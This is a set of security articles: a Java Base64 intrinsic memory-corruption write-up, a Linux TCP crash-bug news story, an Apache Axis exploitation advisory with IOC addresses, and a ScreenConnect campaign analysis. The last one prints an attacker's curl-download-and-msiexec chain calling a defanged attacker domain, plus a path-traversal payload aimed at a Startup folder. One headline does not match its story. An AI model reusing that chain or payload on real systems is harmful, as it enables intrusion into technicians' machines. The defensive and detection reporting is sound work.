The code starts with a 64-bit value whose bits are all set, then uses BZHI to retain the requested number of low bits:

__ movq(output_mask, -1); __ bzhiq(output_mask, output_mask, output_size);

BZHI reads its bit count from the low byte of the last operand. For -1, that byte is 255. For -2, it is 254. Both exceed the width of the 64-bit operand, so the instruction leaves all 64 bits set.

The contents of the write also follow from the implementation. The tail handler fills unused input positions with the character a before decoding the vector. Much of the excess output is consequently the repeating byte pattern 69 a6 9a. The vulnerability causes a constrained overwrite rather than a freely chosen 64-byte value.

An exception does not contain the corruption

The decoder eventually throws IllegalArgumentException for the malformed input. The Java API permits partially written output when decoding fails. Here, however, the native routine has written outside the output array altogether.

This explains why the symptom may appear far from the decoder call. A write into unused heap space can go unnoticed. A write into an object header can instead damage information that the JVM consults later, including during garbage collection. Catching the decoding exception leaves that damage in place.

Mitigation

Follow your Java runtime vendor's guidance for a fixed build. Include runtimes bundled with applications and container images in that review. After updating a container base image, rebuild and redeploy the application image. Restart affected Java processes so they use the updated runtime.

If an update cannot be deployed immediately, our tests confirmed two JVM startup options that prevented the out-of-bounds writes.

To disable the Base64 intrinsics specifically, add:

-XX:-UseBASE64Intrinsics

Alternatively, on x86-64 deployments, disable AVX-512 execution by limiting the JVM to AVX2:

-XX:UseAVX=2

Disabling the Base64 intrinsics is the narrower workaround. Limiting AVX affects other JVM operations that use AVX-512, so assess its performance impact on your workload.

Scope UseAVX=2 to x86 deployments. Native ARM64 JVMs do not execute the vulnerable code, and they do not recognize this option. Adding it to shared startup settings can prevent ARM64 services from starting.

Apply the selected option to the application's JVM startup configuration and restart the service. Check the running process, including any bundled runtime, rather than relying on the Java installation found on your shell's path. Where jcmd is available, inspect the runtime version and effective flags with:

jcmd <PID> VM.version jcmd <PID> VM.flags -all

Confirm that the process reports UseBASE64Intrinsics = false or UseAVX = 2, depending on the workaround selected.

How Datadog can help

Datadog Live Processes provide real-time visibility into the processes running on your infrastructure. You can use it to identify Java processes running on x86-64 hosts, then filter to determine which hosts are running an affected Java runtime.

Datadog Cloud Security Management reports findings for CVE-2026-114938. Check the vulnerability findings for affected hosts and container images.

Conclusion

While this vulnerability can lead to remote code execution, its practical impact depends on the environment.

Applications running on processors without AVX-512 VBMI support are not affected by this vulnerability. On affected systems, denial of service is more readily achievable than reliable code execution. Attackers seeking to execute arbitrary code would need to tailor their exploits to the Java runtime and application behavior, which complicates the development of a broadly reusable exploit.

These constraints give security teams a way to prioritize their response, but affected services still need prompt attention. Follow your runtime vendor’s guidance for a fixed build, including Java runtimes bundled with applications or container images. Where an update cannot be deployed immediately, disable the vulnerable decoding path as a temporary workaround.

articles.title: Google Project Zero Slashes Bug Disclosure Deadlines, Splitting Experts
NoisyTCP bug gives Linux servers a remote crash problem 11 years in the making
articles.context: The vulnerability, tracked as CVE-2026-99288 and dubbed NoisyTCP, was discovered by security researcher Hyunwoo Kim, who says it affects almost all Linux distributions
articles.full_text: The researcher who sounded the alarm over Dirty Frag earlier this year has uncovered another Linux kernel flaw, and this one lets attackers crash entire servers remotely without so much as a password. The vulnerability, tracked as CVE-2026-99288 and dubbed NoisyTCP, was discovered by security researcher Hyunwoo Kim, who says it affects almost all Linux distributions. The flaw dates back to October 2015 and went unnoticed until this year, when Kim found and patched it. Attackers don't need to log in or get their hands on any credentials to cause trouble. They can simply knock the server over, although there's no evidence yet that the flaw can be used to steal data or hijack a machine. The bug is buried in Linux's TCP networking code. Two parts of the kernel can trip over each other while processing incoming traffic, leaving one trying to use memory that's already been freed. When that happens, Linux can panic and take the whole machine down with it. Kim says there's no need for any special server configuration either. Services such as Nginx, Apache, and SSH can be vulnerable straight out of the box. An attacker needs access to an open TCP port on a system that processes incoming network traffic across multiple receive queues or CPUs. Perhaps more concerning for administrators running containerized workloads, the damage isn't necessarily limited to the application being attacked. Because the flaw sits in the Linux kernel, crashing a web server inside a container can take down the underlying host and anything else running on it. Kim found that the attack was particularly effective against virtual machines. During testing, he managed to crash Nginx, Apache, and SSH servers running on QEMU/KVM virtual machines in between five seconds and two minutes. Physical hardware put up more of a fight. Even after tailoring his exploit to the target machine, Kim needed roughly 14 hours to crash a bare-metal server running Nginx. Kim has a knack for finding holes in Linux. Back in May, he uncovered Dirty Frag, a kernel bug that allowed local users to gain root privileges. That one caused headaches for administrators when a working exploit went public before patches were ready. His latest discovery, NoisyTCP, has another potentially nasty trick up its sleeve. Kim identified a second exploitation path involving a use-after-free condition, although pulling it off is considerably more difficult than simply crashing a server. In his advisory, Kim says he has developed a limited exploit targeting virtual machines in a lab environment but has yet to demonstrate a general-purpose remote code execution attack. For the moment, the confirmed impact is remote denial of service. A fix was committed to the upstream Linux kernel on November 3, but administrators will need to check whether their distribution has shipped an updated kernel. Red Hat has rated the vulnerability Important, assigning it a CVSS score of 7.5. For those unable to patch immediately, Kim suggests two temporary workarounds: disabling TCP SYN cookies or restricting incoming packet processing to a single receive queue. Neither is particularly appealing. Disabling SYN cookies reduces protection against SYN flood attacks, while limiting packet processing can hurt network performance. The former also needs to be applied separately to containers using their own network namespaces. Kim published the details on November 15, once the disclosure embargo was lifted. The bug had been hiding in plain sight since 2015, leaving Linux servers vulnerable to remote crashes for 11 years. Not bad for a flaw that doesn't even require a login. ®

articles.title: Rapid7 Detected Exploitation of CVE-2026-90436 against Atlassian Confluence Data Center, N-able N-central also Exploited
articles.context: Overview On November 6, 2026, the Apache Software Foundation disclosed CVE-2026-90436, a critical unsafe reflection vulnerability (CWE-470) in Axis 1
articles.full_text:
Overview

On November 6, 2026, the Apache Software Foundation disclosed CVE-2026-90436, a critical unsafe reflection vulnerability (CWE-470) in Axis 1.x that allows for unauthenticated remote code execution (RCE). Apache Axis is a Simple Object Access Protocol (SOAP) implementation used for the creation of Java Web services. CISA has assigned CVE-2026-90436 a CVSS score of 9.8 Critical.

Since the initial November 6 disclosure, it has transpired that some versions of Atlassian Confluence Data Center and N-able N-central use the affected Axis library and are vulnerable to CVE-2026-90436. Both products require a non-default configuration in order to be vulnerable.

CVE-2026-90436 is now being actively exploited in the wild against both known affected products. On November 13, 2026, Rapid7 MDR detected exploitation of CVE-2026-90436 against Atlassian Confluence Data Center in a customer environment. Separately, on November 13, 2026, N-able reported exploitation in the wild against N-central for a vulnerability that strongly correlates to CVE-2026-90436. A proof-of-concept exploit that leverages CVE-2026-90436 and targets N-central was published on November 12, 2026, as part of a series of public zero-day disclosures against N-central.

Rapid7 recommends remediating exposed systems on an emergency basis outside of normal patching cycles.

Mitigation guidance

Prioritize internet-accessible instances with the relevant APIs enabled, and check internal deployments as well. Apply the product-specific actions below, then investigate systems that were exposed for evidence of compromise.

Axis 1.x through 1.4 is affected but has reached end of life (EOL) and Apache does not plan to publish a fixed Axis 1.x release. Apache recommends moving to another SOAP engine (for example, Apache Axis 2) or using an Axis 1.x build with this patch applied. Organizations using products that are affected by this issue should follow the product vendor's specific remediation instructions.

Atlassian Confluence Data Center

Atlassian lists versions 1.x through to 9.x as affected when “Remote API (XML-RPC & SOAP)” is enabled. Version 9.2.28 is the fixed release. The setting has been off by default for new installations since version 3.0. Confluence version 10.x and later removed the feature so are not vulnerable, and Atlassian Cloud is unaffected.

Affected users should upgrade to version 9.2.28 or a current unaffected 10.x release. If patching must wait, an administrator can open “General Configuration” and “Further Configuration”, edit the settings, clear “Remote API (XML-RPC & SOAP)”, and save. The change takes effect without restarting Confluence, but integrations using the API may stop working.

Follow the Confluence advisory for the latest fixes and mitigation instructions.

N-able N-central

On-premises administrators should confirm that “Legacy API” is disabled, even on 2026.4 HF2. N-able states that it is off by default, and provides instructions for disabling Legacy API. Its November 13 guidance says hosted environments received temporary protections directly; customers in both hosting models must still follow the vendor's Agent and Probe upgrade guidance. N-able also temporarily disabled the Intune integration as a precaution. Refer to the N-able security update for these responsibilities.

N-able says 2026.4 HF3 will permanently remove Legacy API access. Its November 16 rollout notice states that hosted upgrades have been completed, and on-premises general availability is being finalized. On-premises administrators should confirm availability and follow the release instructions as the update becomes available.

IOCs

The presence of these IOCs in logs should prompt investigation, but the absence of these addresses does not confirm that an environment was unaffected.

Atlassian Confluence Data Center

The following IP addresses are associated with observed exploitation of CVE-2026-90436 against Atlassian Confluence Data Center:

192.238.253[.]176

5.133.47[.]243

163.182.68[.]109

104.13.106[.]166

N-able N-central

N-able's November 13 incident update lists these IP addresses as IOCs for N-central customers who had not disabled Legacy API.

157.20.241[.]16

139.99.69[.]109

79.76.51[.]56

The vendor's update also lists associated URLs for use in compromise assessment.

Updates

November 16, 2026: Initial publication.

articles.title: CVE-2026-84869 in ScreenConnect Exploited to Run Malicious Files on MSP Technician Accounts
articles.context: The malware, called SCKit, appears to be leveraging a vulnerable third-party extension on the server side of ScreenConnect and not directly exploiting CVE-2026-84869, but...
articles.full_text:
What Is CVE-2026-84869?

ConnectWise disclosed CVE-2026-84869 on September 8, 2026, with a CVSS score of 9.9, and CISA added the CVE to its Known Exploited Vulnerabilities catalog on September 11. ConnectWise's advisory stated that in both Support and Access sessions, a guest could trigger file-transfer actions that the technician's host client processed without authorization or confirmation, including running the file with elevated rights. ConnectWise listed 26.6.5 as the fixed version for host clients and Access agents, and recommended removing the TransferFiles permission as an interim mitigation.

Figure 1: CVE-2026-84869 file transfer spray campaign by the numbers

In the days leading up to CVE-2026-84869's disclosure, Huntress stood up a Rapid Response to worm-like activity that spawned rogue ScreenConnect clients and dropped malicious VBScript files across several customer environments. On November 11, we stood up another Rapid Response to more worm-like activity where an attacker used Run commands on cloud-hosted panels to install rogue ScreenConnect clients and session-cookie relays on hundreds of managed endpoints. The malware, called SCKit, appears to be leveraging a vulnerable third-party extension on the server side of ScreenConnect and not directly exploiting CVE-2026-84869, but attempting to stage it as a "relay trap" for subsequent technician connections.

This most recent activity is distinct from a separate campaign we reported on November 13 that planted unauthorized guest sessions disguised with crypto exchange names on more than 100 MSP ScreenConnect servers. While we did not observe the attacker using the unauthorized sessions in this manner, the crypto exchange names may be intended to lure a technician into opening the session and running a malicious file on their client.

An MSP technician's workstation typically holds RMM consoles, saved credentials, and access to every customer, making it an exceptionally attractive target. When a technician joins a remote session, their ScreenConnect host client and the guest machine can exchange files. Normally, the technician decides what moves and what runs.

A malicious guest exploiting CVE-2026-84869 can push a file to the technician's machine and get the technician's own client to run it. From the technician's view, no prompt appears. They only have to join the session, whether from an attacker-controlled machine or a real customer's support session that the attacker has slipped into as an extra guest.

Huntress Observations

A full compromise in 9 seconds

On November 12, we observed a technician at one MSP using their ScreenConnect host client to join a blank-named Access session on the MSP's server. Here's what the process telemetry from the technician's workstation shows, in UTC:

Time

What happened

16:46:20.7

The host client runs a guest-pushed update_224ac089.bat from the client's Documents\...\Temp\ folder, with the argument xhsdf_wrwerhjf_shhdga

16:46:21.7

The script relaunches itself hidden through PowerShell and WScript.Shell

16:46:22.2

It decodes a Base64 Telegram bot token and chat ID and reports the new victim to the operator

16:46:22.6

Recon: reg query for the Windows product name and build, a check for an existing copy of its own client, and net session to test for admin rights

16:46:23.9

curl downloads hxxps://masterdarky[.]com/WindowsUpdate.msi to %TEMP%\wupdate_224ac089.msi

16:46:25.8

msiexec /a ... TARGETDIR=%LOCALAPPDATA%\wclient_224ac089 /qn unpacks the MSI as an administrative image, which leaves no install record

16:46:26.2

sc config seclogon start= auto and net start seclogon

16:46:28.3

runas /trustlevel:0x20000 and a PowerShell Start-Process launch the payload; csc.exe compiles a PowerShell Add-Type

16:46:29.1

WindowsUpdate.WindowsClient.exe "h=masterdarky[.]com&p=8041&k=..." starts: a rebranded ScreenConnect client connected to the attacker's relay

Figure 2: The CVE-2026-84869 exploitation chain on a technician workstation on November 12, 2026

The attacker now has their own remote-access client on the technician's machine that looks like legitimate ScreenConnect and named after Windows Update.

The observed curl commands suggest that the attacker may have expected unreliable networks in their spraying attempts:

-A "Mozilla/5.0" --ssl-no-revoke --tlsv1.2 -f -L -C - --connect-timeout 20 --max-time 900 --retry 2 --speed-limit 2048 --speed-time 60

The spray: hundreds of thousands of requests, waiting for someone to join

How did that batch file reach the technician? On other MSPs' servers, we can see the delivery side in the server's own database.

Across 42 MSP ScreenConnect servers between October 20 and November 16, attacker guests made 688,000 "run file" requests for files named update.bat or update_<8 hex>.bat from 29 source IP addresses. On the busiest server, 10 guest sessions from seven IPs made 70,414 requests over three weeks. The guests made repeated requests in case a technician happened to join.

Figure 3: Guest "run file" requests for update.bat-style batch files per ScreenConnect server, anonymized

The <8 hex> part of the file name looks like a payload or wave ID, not a per-victim ID. That's what ties the spray to the full compromise above: the exact file update_224ac089.bat was sprayed at five MSP ScreenConnect servers, starting within 2 seconds of each other at 16:03 UTC on November 12, 43 minutes before the compromise. Each server received it between 585 and 5,671 times, and three were still receiving it on November 16. The day before, the same sessions sprayed an earlier wave, update_c99a4b29.bat. We assess with high confidence that the spray operator and the masterdarky[.]com operator are the same.

What the spray guests look like:

blank session names or default-looking Windows hostnames

a claimed guest client version matching the server's own build (25.8.3.9466 on the busiest server)

no preview image, or a JPEG

an empty guest public key on about half of the sessions on the busiest server

All five sessions that sprayed update_224ac089.bat , and 27 spray sessions across 17 servers in total, have the session's Company property (CustomProperty1) set to crypto client. This is distinct from our previous reporting on crypto-exchange named decoys, which had this property left blank.

Canary song: A test run on a second technician

On November 13 at 01:49 UTC, a technician at another MSP joined a session presenting as a laptop. The guest, at 91.224.92[.]167, had been reconnecting to the MSP's server since late October, even after a technician queued it for uninstall. Two seconds after the technician joined, the guest pushed marker.txt. About three seconds after that, the technician's client ran it, and it opened in Notepad++. Nothing else followed until the host went offline 18 minutes later.

A harmless text file that announces itself is a classic canary; it proves the exploit works against this target before anything real is sent. The same IP pushed marker.txt three times at a technician at a third MSP in late October, each time while that technician was connected. We don't know whether that client ran it. Unlike the spray, this guest looked like a real, named Windows machine with a non-empty key and screenshot, which would fit a person driving it by hand.

This technician had also joined one of the unauthorized crypto-named guest sessions we were investigating about a minute earlier. While nothing came from that session, we mention it because it shows how close the two campaigns come in practice, targeting the same technician on the same vulnerable client inside a minute.

Path traversal into a technician's Startup folder

The most targeted activity we found happened in October, on one MSP's server. In three real support sessions technicians created for customers over multiple days, an attacker joined as an additional guest and asked the technician's client to run the following file:

../../../AppData/Roaming/Microsoft/Windows/STARTM~1/Programs/Startup/Sync.bat

If the client honored that path, it would drop a script into the technician's own Startup folder, where it would run at their next logon. Each push was sent while a different technician was connected (October 23, 24 and 27), from 193.26.115[.]63 and 57.128.131[.]66. Two of the technicians were on vulnerable Windows clients while the third used the Mac client, where a Windows Startup path failed.

A near-miss

On October 19, a guest at 91.224.92[.]83 (the same /24 as the canary IP) pushed Run-Lateral.bat seven times at a technician on a vulnerable 24.2 client. The closest push arrived 4.3 seconds after the technician disconnected, so nothing was delivered. We count this as a near-miss, not an exposure.

On another server, a guest at 107.148.223[.]37 pushed svc_payload.cmd 207 times; the technician joined only after the last push.

Figure 4: Spray activity per server and technician-exposure events, October 19 to November 16, 2026

What should MSPs do?

1. Patch technician clients now

Update every technician's ScreenConnect host client to 26.6.5 or later, and any Access agents ConnectWise lists. Updating the server alone doesn't fix this, because the vulnerable code runs on the technician's machine. Your server's connection history records which client version each technician used. In the cases discussed in this post, many technicians were still on 22.x, 24.2 and 25.8 clients weeks after the fix shipped.

If you can't patch today, remove the TransferFiles permission from roles and session groups, as ConnectWise advises.

2. Hunt for exposure

On the server (App_Data\Session.db, work on a copy), look for RanFiles (EventType 85) or SentFiles (86) events sent by a guest connection (ProcessType = 2), especially:

repeated requests for update.bat / update_<8hex>.bat in blank-named sessions

marker.txt, Run-Lateral.bat, svc_payload.cmd

any path containing ../

Then check whether a Host connection (ProcessType = 1) was open at that moment. That overlap is the exposure.

On technician workstations, look for:

ScreenConnect.WindowsClient.exe (or your branded client) running .bat, .cmd, .ps1, .vbs,.js, or .txt files from Documents\*\Temp\

anything in %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ you didn't put there, especially Sync.bat

folders named %LOCALAPPDATA%\wclient_<8hex> and files named %TEMP%\wupdate_<8hex>.msi

WindowsUpdate.WindowsClient.exe or any ScreenConnect client whose command line points at a relay that isn't yours.

Kill spray sessions by deleting blank-named guest sessions that keep asking to run update*.bat. They come back, so check again.

3. If you find a hit

Isolate the technician's workstation, then:

Kill the rogue client and remove %LOCALAPPDATA%\wclient_<id> and the wupdate_<id>.msi.

Set seclogon back to its normal start type.

Rotate every credential that was reachable from that workstation: RMM, PSA, ScreenConnect, password vault, and customer admin accounts.

Assume the attacker could see everything the technician could.

4. Shrink the attack surface

Restrict who can join sessions as a guest, and review guest-side permissions on Support sessions.

Restrict access to your ScreenConnect web interface and installer downloads by IP or VPN where you can.

Don't join unattended sessions you can't tie to a customer.

Detection opportunities

Process: msiexec.exe /a with TARGETDIR=%LOCALAPPDATA%\<prefix>_<8hex>, followed by runas /trustlevel:0x20000.

Process: curl downloading an .msi from a script that a ScreenConnect host client started.

Server: Guest-originated RanFiles with ../ traversal or a Startup path; high-volume RanFiles from one guest session.

Network: Outbound ScreenConnect relay connections (often port 8041) on domains you don't own.
